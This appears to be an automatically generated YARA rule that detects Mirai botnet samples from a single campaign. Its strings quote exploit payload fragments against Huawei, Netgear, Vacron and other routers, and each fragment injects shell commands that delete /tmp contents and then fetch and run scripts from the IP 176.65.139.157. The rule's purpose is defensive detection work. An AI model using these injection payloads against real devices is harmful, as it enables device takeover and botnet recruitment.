rule Sightlines_c2_f1f6fa03_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-f1f6fa03"
        date = "2026-10-24"
        campaign = "c2-f1f6fa03"
        family = "mirai"
        hash = "0e67f85a45a9dfa874c2b1925415d984682ccd2ba2e6fbd51f2bb6b457d7eec7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-f1f6fa03.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ce:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -q -O /tmp/huawei 'http://176.65.139.157/te" ascii
        $s1 = "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-ins" ascii
        $s2 = "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://176.65.139.157/wawan2" ascii
        $s3 = "lnet2.sh'; sh /tmp/huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgr" ascii
        $s4 = "GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://176.65.139.157/telnet2" ascii
        $s5 = "GET /cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://176.65.139.157/telnet2.sh;$" ascii
        $s6 = "OAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><u:SetNTPServers xm" ascii
        $s7 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://176.65.139.157/telnet2.sh;sh+/tmp/vacron" ascii
        $s8 = "e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=" ascii
        $s9 = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://176.65.139.157/wawan2.sh+-" ascii
        $s10 = "uration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://176.65.139.157/telnet2.s" ascii
        $s11 = "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://176.65.139.157/telnet2.sh;sh+/tmp/awsec2" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1399932 and 3 of them
}
